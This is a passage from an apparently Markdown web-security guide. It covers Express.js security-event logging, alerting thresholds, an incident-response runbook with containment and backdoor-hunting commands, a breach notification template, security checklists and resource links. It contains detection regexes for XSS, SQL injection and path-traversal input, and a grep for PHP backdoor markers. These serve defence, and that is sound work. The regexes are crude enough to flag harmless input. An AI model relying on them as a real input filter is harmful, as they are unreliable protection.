  });
}

// Authentication events
app.post('/auth/login', async (req, res) => {
  const { username, password } = req.body;

  try {
    const user = await authenticateUser(username, password);

    // ✅ Log successful login
    logSecurityEvent('LOGIN_SUCCESS', {
      userId: user.id,
      username: user.username,
      ip: req.ip,
      userAgent: req.headers['user-agent']
    });

    res.json({ success: true });
  } catch (error) {
    // ✅ Log failed login
    logSecurityEvent('LOGIN_FAILURE', {
      username,
      ip: req.ip,
      reason: error.message,
      userAgent: req.headers['user-agent']
    });

    res.status(401).json({ error: 'Invalid credentials' });
  }
});

// Authorization failures
app.get('/api/admin', auth, checkAdmin, (req, res) => {
  // checkAdmin middleware logs unauthorized access attempts
});

const checkAdmin = (req, res, next) => {
  if (req.user.role !== 'admin') {
    // ✅ Log unauthorized access attempt
    logSecurityEvent('UNAUTHORIZED_ACCESS', {
      userId: req.user.id,
      resource: req.path,
      method: req.method,
      ip: req.ip,
      requiredRole: 'admin',
      actualRole: req.user.role
    });

    return res.status(403).json({ error: 'Forbidden' });
  }
  next();
};

// Suspicious activities
app.use((req, res, next) => {
  // Detect potential attacks
  const suspiciousPatterns = [
    /<script[\s\S]*?>[\s\S]*?<\/script>/gi,  // XSS
    /(\bOR\b|\bAND\b).*?[=<>]/gi,            // SQL Injection
    /\.\.\/|\.\.%2F/gi,                       // Path traversal
    /%00|null/gi                              // Null byte
  ];

  const input = JSON.stringify(req.body) + req.url;

  for (const pattern of suspiciousPatterns) {
    if (pattern.test(input)) {
      // ✅ Log potential attack
      logSecurityEvent('POTENTIAL_ATTACK', {
        type: pattern.toString(),
        userId: req.user?.id,
        ip: req.ip,
        path: req.path,
        method: req.method,
        body: req.body,
        query: req.query
      });

      // Optional: Block request
      // return res.status(400).json({ error: 'Invalid input' });
    }
  }

  next();
});

// Rate limit exceeded
// (Handled by rate-limit middleware, logged automatically)

// Data export/download
app.get('/api/export', auth, async (req, res) => {
  // ✅ Log data export
  logSecurityEvent('DATA_EXPORT', {
    userId: req.user.id,
    resource: 'user_data',
    ip: req.ip
  });

  const data = await exportUserData(req.user.id);
  res.json(data);
});

// Account changes
app.put('/api/users/:id/role', auth, checkAdmin, async (req, res) => {
  const { role } = req.body;
  const targetUserId = req.params.id;

  // ✅ Log privileged action
  logSecurityEvent('ROLE_CHANGE', {
    adminId: req.user.id,
    targetUserId,
    oldRole: await getUserRole(targetUserId),
    newRole: role,
    ip: req.ip
  });

  await updateUserRole(targetUserId, role);
  res.json({ success: true });
});

╔════════════════════════════════════════════════════════════╗
║                   REAL-TIME MONITORING                     ║
╚════════════════════════════════════════════════════════════╝

Alerting System:
─────────────────────────────────────────────────────────────
const axios = require('axios');

// Alert threshold configuration
const alertThresholds = {
  FAILED_LOGINS: { count: 10, window: 300000 },      // 10 in 5 min
  UNAUTHORIZED_ACCESS: { count: 5, window: 60000 },  // 5 in 1 min
  POTENTIAL_ATTACK: { count: 3, window: 60000 },     // 3 in 1 min
  DATA_EXPORT: { count: 5, window: 3600000 }         // 5 in 1 hour
};

// Track events in memory (or Redis for production)
const eventCounter = new Map();

function trackSecurityEvent(eventType, identifier) {
  const key = `${eventType}:${identifier}`;
  const now = Date.now();

  if (!eventCounter.has(key)) {
    eventCounter.set(key, []);
  }

  const events = eventCounter.get(key);
  events.push(now);

  // Remove old events outside window
  const threshold = alertThresholds[eventType];
  const cutoff = now - threshold.window;
  const recentEvents = events.filter(time => time > cutoff);
  eventCounter.set(key, recentEvents);

  // Check if threshold exceeded
  if (recentEvents.length >= threshold.count) {
    sendSecurityAlert(eventType, identifier, recentEvents.length);

    // Optional: Take automatic action
    if (eventType === 'FAILED_LOGINS') {
      lockAccount(identifier);
    }
  }
}

// Send alert
async function sendSecurityAlert(eventType, identifier, count) {
  const message = `🚨 Security Alert: ${eventType}\n` +
                  `Identifier: ${identifier}\n` +
                  `Count: ${count}\n` +
                  `Time: ${new Date().toISOString()}`;

  // Send to Slack
  await axios.post(process.env.SLACK_WEBHOOK, {
    text: message,
    channel: '#security-alerts'
  });

  // Send to PagerDuty (for critical alerts)
  if (['POTENTIAL_ATTACK', 'DATA_BREACH'].includes(eventType)) {
    await axios.post('https://events.pagerduty.com/v2/enqueue', {
      routing_key: process.env.PAGERDUTY_KEY,
      event_action: 'trigger',
      payload: {
        summary: message,
        severity: 'critical',
        source: 'security-system'
      }
    });
  }

  // Log alert
  securityLogger.error('SECURITY_ALERT_TRIGGERED', {
    eventType,
    identifier,
    count
  });
}

// Usage
app.post('/auth/login', async (req, res) => {
  try {
    // ... authentication logic ...
  } catch (error) {
    trackSecurityEvent('FAILED_LOGINS', req.body.username);
    // ... error handling ...
  }
});

╔════════════════════════════════════════════════════════════╗
║                   INCIDENT RESPONSE PROCEDURES             ║
╚════════════════════════════════════════════════════════════╝

Incident Response Runbook:
─────────────────────────────────────────────────────────────

1. DETECTION
─────────────────────────────────────────────────────────────
Alert received → Verify it's real incident → Assess severity

Severity Levels:
• P0 (Critical): Active data breach, system compromise
• P1 (High): Vulnerability being exploited, major data leak
• P2 (Medium): Suspicious activity, potential vulnerability
• P3 (Low): Policy violation, minor security issue

2. IMMEDIATE RESPONSE
─────────────────────────────────────────────────────────────
☐ Alert security team
☐ Document everything (time, actions, findings)
☐ Preserve evidence (logs, snapshots)
☐ Don't alert attacker (if ongoing)

3. CONTAINMENT
─────────────────────────────────────────────────────────────
Short-term containment:
☐ Isolate affected systems
☐ Block malicious IPs
☐ Disable compromised accounts
☐ Revoke compromised API keys/tokens

# Block IP
iptables -A INPUT -s <attacker-ip> -j DROP

# Revoke all sessions for user
DELETE FROM sessions WHERE user_id = <compromised-user-id>;

# Disable account
UPDATE users SET status = 'locked' WHERE id = <compromised-user-id>;

# Revoke API keys
UPDATE api_keys SET revoked = true WHERE user_id = <compromised-user-id>;

Long-term containment:
☐ Patch vulnerabilities
☐ Change credentials
☐ Update firewall rules
☐ Strengthen monitoring

4. ERADICATION
─────────────────────────────────────────────────────────────
☐ Remove malware/backdoors
☐ Close vulnerability
☐ Delete malicious accounts
☐ Clean infected files

# Check for backdoors
find /var/www -type f -name "*.php" -mtime -7 -exec grep -l "eval\|base64_decode\|system\|exec" {} \;

# Verify file integrity
debsums -c  # Debian/Ubuntu
rpm -Va     # RedHat/CentOS

5. RECOVERY
─────────────────────────────────────────────────────────────
☐ Restore from clean backup
☐ Rebuild compromised systems
☐ Verify system integrity
☐ Monitor for reinfection

# Restore database
mysql -u root -p database_name < backup.sql

# Verify backup
sha256sum backup.tar.gz
# Compare with original checksum

6. POST-INCIDENT REVIEW
─────────────────────────────────────────────────────────────
☐ Timeline of events
☐ Root cause analysis
☐ What went well / What didn't
☐ Action items for improvement
☐ Update incident response plan
☐ Security training for team

╔════════════════════════════════════════════════════════════╗
║                   BREACH NOTIFICATION                      ║
╚════════════════════════════════════════════════════════════╝

If Personal Data Compromised:
─────────────────────────────────────────────────────────────
Legal Requirements (varies by jurisdiction):
• GDPR (EU): 72 hours to report to authority
• CCPA (California): "Without unreasonable delay"
• HIPAA (US Healthcare): 60 days

Notification Checklist:
☐ Notify legal team
☐ Notify regulatory authorities (if required)
☐ Notify affected users
☐ Prepare public statement
☐ Offer credit monitoring (if appropriate)
☐ Document all notifications

User Notification Template:
─────────────────────────────────────────────────────────────
Subject: Important Security Notice

Dear [User],

We are writing to inform you of a security incident that may
have affected your account.

What Happened:
On [DATE], we discovered [BRIEF DESCRIPTION]. We immediately
took action to [CONTAINMENT ACTIONS].

What Information Was Involved:
[LIST SPECIFIC DATA TYPES - be transparent]

What We're Doing:
- [ACTION 1]
- [ACTION 2]
- [ACTION 3]

What You Should Do:
1. Change your password immediately
2. Enable two-factor authentication
3. Monitor your account for suspicious activity
4. Review our security tips: [LINK]

We sincerely apologize for this incident and are committed to
protecting your data.

Contact Us:
If you have questions, contact security@company.com

Sincerely,
[COMPANY] Security Team

═══════════════════════════════════════════════════════════
```

---

<div align="center">

## ✅ Security Checklists

</div>

### Comprehensive Security Checklists ✅

```bash
# ═══════════════════════════════════════════
# SECURITY CHECKLISTS
# ═══════════════════════════════════════════

╔════════════════════════════════════════════════════════════╗
║                   PRE-LAUNCH SECURITY CHECKLIST            ║
╚════════════════════════════════════════════════════════════╝

Authentication & Authorization:
─────────────────────────────────────────────────────────────
☐ Strong password requirements enforced (8+ chars, mixed case, numbers, symbols)
☐ Password hashing with bcrypt/Argon2 (salt rounds ≥ 10)
☐ Rate limiting on login (5 attempts / 15 min)
☐ Account lockout after failed attempts
☐ Secure session management
☐ JWT tokens with expiration (≤ 15 min)
☐ Refresh token rotation
☐ Multi-factor authentication available
☐ OAuth 2.0 implemented correctly
☐ RBAC enforced on all endpoints
☐ API key rotation policy
☐ Secure password reset flow
☐ Email verification required

Input Validation:
─────────────────────────────────────────────────────────────
☐ All user input validated (whitelist approach)
☐ Parameterized queries / ORM used (prevent SQL injection)
☐ NoSQL injection prevented (type checking)
☐ Command injection prevented
☐ Path traversal prevented
☐ File upload restrictions (type, size, content)
☐ XML/XXE attacks prevented
☐ Deserialization attacks prevented

XSS Prevention:
─────────────────────────────────────────────────────────────
☐ Output encoding/escaping implemented
☐ Content Security Policy configured
☐ HTTPOnly cookies
☐ Sanitization library used (DOMPurify)
☐ Template engine auto-escaping enabled
☐ Avoid innerHTML with user data
☐ CSP nonces for inline scripts

CSRF Protection:
─────────────────────────────────────────────────────────────
☐ CSRF tokens on state-changing operations
☐ SameSite cookies (Strict or Lax)
☐ Origin/Referer validation
☐ Custom headers for AJAX requests

Security Headers:
─────────────────────────────────────────────────────────────
☐ Strict-Transport-Security (HSTS)
☐ Content-Security-Policy
☐ X-Frame-Options (deny or sameorigin)
☐ X-Content-Type-Options (nosniff)
☐ Referrer-Policy
☐ Permissions-Policy
☐ X-XSS-Protection
☐ Remove X-Powered-By
☐ Secure CORS policy

Cryptography:
─────────────────────────────────────────────────────────────
☐ HTTPS everywhere (force redirect)
☐ TLS 1.2+ only
☐ Strong cipher suites
☐ HSTS preload submitted
☐ Certificate pinning (mobile apps)
☐ Encryption at rest (database, files)
☐ Secure key management (env vars, KMS)
☐ Key rotation policy
☐ No hardcoded secrets
☐ Secrets not in version control

API Security:
─────────────────────────────────────────────────────────────
☐ Authentication on all endpoints
☐ Authorization checks
☐ Rate limiting (global + per-user)
☐ API versioning
☐ Input validation
☐ Output filtering (no sensitive data leak)
☐ Error messages sanitized
☐ CORS configured correctly
☐ API documentation security reviewed

Session Management:
─────────────────────────────────────────────────────────────
☐ Secure session ID generation
☐ Session expiration (15-30 min idle)
☐ Absolute session timeout (24 hours)
☐ Session invalidation on logout
☐ Concurrent session limits
☐ Session fixation prevented
☐ Secure cookie flags (HttpOnly, Secure, SameSite)

File Handling:
─────────────────────────────────────────────────────────────
☐ File upload size limits
☐ File type validation (content, not just extension)
☐ Virus scanning
☐ Separate upload directory (outside webroot)
☐ No execute permissions on upload directory
☐ Unique file names (prevent overwriting)
☐ Path traversal prevented

Error Handling:
─────────────────────────────────────────────────────────────
☐ Generic error messages (production)
☐ No stack traces exposed
☐ No database errors exposed
☐ Detailed errors logged (not shown)
☐ Error monitoring (Sentry)

Logging & Monitoring:
─────────────────────────────────────────────────────────────
☐ Security events logged
☐ Authentication events logged
☐ Authorization failures logged
☐ Input validation failures logged
☐ Log retention policy (90+ days)
☐ Centralized logging
☐ Real-time alerting
☐ Log integrity (tamper-proof)
☐ PII not logged

Database Security:
─────────────────────────────────────────────────────────────
☐ Least privilege database users
☐ Separate DB users per environment
☐ Prepared statements / parameterized queries
☐ Database encryption at rest
☐ Encrypted connections (SSL/TLS)
☐ Regular backups
☐ Backup encryption
☐ Backup testing
☐ Database firewall rules

Infrastructure:
─────────────────────────────────────────────────────────────
☐ Firewall configured
☐ Unnecessary ports closed
☐ SSH key authentication only
☐ Disable root login
☐ Regular security updates
☐ DDoS protection (CloudFlare, AWS Shield)
☐ WAF configured
☐ Network segmentation
☐ Intrusion detection

Dependencies:
─────────────────────────────────────────────────────────────
☐ No known vulnerabilities (npm audit, Snyk)
☐ Dependency pinning
☐ Regular updates
☐ Automated vulnerability scanning
☐ License compliance

Configuration:
─────────────────────────────────────────────────────────────
☐ Debug mode disabled (production)
☐ Default passwords changed
☐ Sample/test files removed
☐ Admin interfaces protected
☐ Directory listing disabled
☐ Unnecessary services disabled
☐ Security.txt file created

Compliance:
─────────────────────────────────────────────────────────────
☐ Privacy policy published
☐ Terms of service published
☐ GDPR compliance (if EU users)
☐ CCPA compliance (if CA users)
☐ Cookie consent
☐ Data retention policy
☐ Data deletion mechanism
☐ Breach notification plan

Testing:
─────────────────────────────────────────────────────────────
☐ SAST performed
☐ DAST performed
☐ Dependency scanning
☐ Penetration testing
☐ Security code review
☐ Vulnerability assessment

Documentation:
─────────────────────────────────────────────────────────────
☐ Security policies documented
☐ Incident response plan
☐ Disaster recovery plan
☐ Security training for team
☐ Security contact published

╔════════════════════════════════════════════════════════════╗
║                   ONGOING SECURITY CHECKLIST               ║
╚════════════════════════════════════════════════════════════╝

Daily:
─────────────────────────────────────────────────────────────
☐ Review security alerts
☐ Check failed login attempts
☐ Monitor rate limit violations
☐ Review access logs

Weekly:
─────────────────────────────────────────────────────────────
☐ Dependency vulnerability scan
☐ Security log review
☐ Backup verification
☐ Certificate expiration check

Monthly:
─────────────────────────────────────────────────────────────
☐ Access review (remove old accounts)
☐ API key audit
☐ Security header check
☐ DAST scan
☐ Update security documentation

Quarterly:
─────────────────────────────────────────────────────────────
☐ Penetration testing
☐ Security training
☐ Disaster recovery test
☐ Third-party risk assessment
☐ Compliance audit

Annually:
─────────────────────────────────────────────────────────────
☐ External security audit
☐ Full penetration test
☐ Review security policies
☐ Update incident response plan
☐ Security architecture review

═══════════════════════════════════════════════════════════
```

---

<div align="center">

## 🎓 Resources & Learning

</div>

### Essential Security Resources 📚

```
📘 Learning Resources
   OWASP: https://owasp.org
   PortSwigger Web Security Academy: https://portswigger.net/web-security
   HackTheBox: https://hackthebox.com
   TryHackMe: https://tryhackme.com
   CTF Challenges: https://ctftime.org

📗 Documentation
   OWASP Top 10: https://owasp.org/www-project-top-ten/
   OWASP Cheat Sheets: https://cheatsheetseries.owasp.org
   CWE Top 25: https://cwe.mitre.org/top25/
   NIST Guidelines: https://www.nist.gov/cybersecurity

📙 Tools
   Burp Suite: https://portswigger.net/burp
   OWASP ZAP: https://owasp.org/www-project-zap/
   Snyk: https://snyk.io
   Nuclei: https://nuclei.projectdiscovery.io

🎥 YouTube Channels
   LiveOverflow
   IppSec
   PwnFunction
   The Cyber Mentor
   Nahamsec

📱 Newsletters
   tl;dr sec: https://tldrsec.com
   Krebs on Security: https://krebsonsecurity.com
   Hacker News: https://news.ycombinator.com

💬 Communities
   r/netsec: https://reddit.com/r/netsec
   r/websecurity: https://reddit.com/r/websecurity
   Security StackExchange: https://security.stackexchange.com
   OWASP Slack: https://owasp.org/slack/invite

📜 Standards & Compliance
   PCI DSS: https://pcisecuritystandards.org
   SOC 2: https://www.aicpa.org/soc
   ISO 27001: https://iso.org/standard/27001
   GDPR: https://gdpr.eu
```

---

<div align="center">

**Built with 🔒 by MrDib, for security-conscious developers**

_Remember: Security is not a feature—it's a requirement_ 🛡️

**Stay Secure!** 🔐

---

### 🔗 Related Guides

- [Authentication Tools](./Authentication-Tools.md)
- [Encryption Tools](./Encryption-Tools.md)
- [Security Scanners](./Security-Scanners.md)

</div>
